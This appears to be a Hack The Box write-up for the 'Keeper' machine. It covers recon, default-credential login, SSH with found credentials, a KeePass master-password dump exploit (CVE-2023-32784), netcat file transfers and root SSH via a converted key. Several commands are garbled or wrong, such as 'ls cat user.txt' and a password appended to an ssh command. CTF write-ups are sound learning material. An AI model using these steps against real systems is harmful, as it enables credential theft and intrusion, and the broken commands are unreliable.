# Unlocking the Secrets of Keeper: A Journey to Root Access

<p align="center">
  <img src="https://github.com/MrGovindDubey/HTB-Machines/assets/118271775/274cad23-f3e3-4ac9-b9a0-b2b6539d214e" align="center" alt="keeper-htb" />
</p>


## Introduction

In the exhilarating realm of ethical hacking, each machine encountered on platforms like Hack The Box presents fresh challenges and captivating discoveries. Keeper, an enigmatic HTB machine, follows suit. This guide will lead you through a systematic journey to conquer Keeper, navigating from the initial foothold to securing the coveted root flag. So, equip your virtual backpack, don your ethical hacker hat, and let's plunge into the adventure!

## Step 1: Setting the Stage

The first step is to identify the machine's IP address. We'll use this address to create a handy host entry for easy access.


```bash
echo "ip tickets.keeper.htb" | sudo tee -a /etc/hosts
```

## Step 2: Reconnaissance with Nmap
Now that we're properly set up, it's time to scan for open ports. We'll start with a basic scan to identify ports 22 (SSH) and 80 (HTTP).

```bash
nmap -p 22,80 tickets.keeper.htb/ipaddressofmachine
```

## Step 3: Exploring the Web
Access the machine's IP address in your browser and observe the redirection to the login page. It's time to play detective and try some random credentials. Miraculously, we're in!

```
Username: root
Password: password
```

## Step 4: The Admin Panel
Navigate to the admin section and prepare to uncover a user's password.

## Step 5: SSH Connection
Connect via SSH using the provided credentials:

```bash

ssh lnorgaard@tickets.keeper.htb Password: Welcome2023!
```

## Step 6: User Flag
With SSH access in hand, locate the user flag:

```bash

ls cat user.txt
```

## Step 7: The CVE and Keepass
Discover a critical CVE and grab the exploit from the following link: [CVE-2023-32784(poc.py)](10.10.11.227/poc.py). Download it to your local machine.

## Step 8: Moving Files
To transfer files between your local machine and the HTB machine, you can use netcat. Run the following commands:

## On the HTB machine:

```bash
nc -nlvp 1234 > poc.py
```

## On your local machine:

```bash
nc [keeperip] 1234 < poc.py
```

Verify the file transfer with ls and cat poc.py.

## Step 9: Exploiting Keepass
Execute the exploit on the HTB machine:


```bash
python3 poc.py -d KeePassDumpFull.dmp
```

_Retrieve the password: rødgrød med fløde_

## Step 10: Using Keepass
Back on your local machine, install Keepass2 with:

```bash

apt install keepass2
```

## Step 11: Unveiling the Secrets
On the HTB machine, locate passcodes.kdbx. Transfer it to your local machine using netcat.

## On your local machine:

```bash
nc -nlvp 1234 > passcodes.kdbx
```
After a brief wait, __press Ctrl+C__.

## Step 12: Keepass Unlocked
Open Keepass2, select "Open File," and choose passcodes.kdbx. Enter the password you found (rødgrød med fløde). Inside, you'll discover user and root credentials.

## Step 13: Root Access
Access the root SSH key, copy it, and save it as root.ppk. Use Puttygen to convert the key:

```bash
puttygen root.ppk -O private-openssh -o id_rsa
```
Finally, SSH into Keeper with root privileges:

```bash
ssh root@tickets.keeper.htb -i id_rsa
```
Discover the root flag:

```bash
ls cat root.txt
```

<hr><ht/>

  # CVE-2023-32784 
  ___KeePass2 Master Password Dumper (CVE-2023-32784)___

  This is a [CVE-2023-32784](https://nvd.nist.gov/vuln/detail/cve-2023-32784) proof-of-concept implemented in Rust. The code is probably ugly due to my poor coding skills, feel free to make a PR to improve it.


  CVE-Credit:vdohney
<hr><ht/>


 <p align="center">
  <img src="https://github.com/MrGovindDubey/HTB-Machines/assets/118271775/2f2ae09a-71f7-4895-b5eb-4008a5e7d69e" align="center" alt="keeper-htb" />
</p>
  
# Conclusion:ss
Our experience in conquering the Keeper HTB machine was not only exciting but also educational. We trust that this guide has illuminated the path of ethical hacking, spanning from the initial reconnaissance phase to achieving root access. Always bear in mind that ethical hacking is a journey of learning, self-challenge, and continuous enhancement of your cybersecurity skills. Happy hacking!


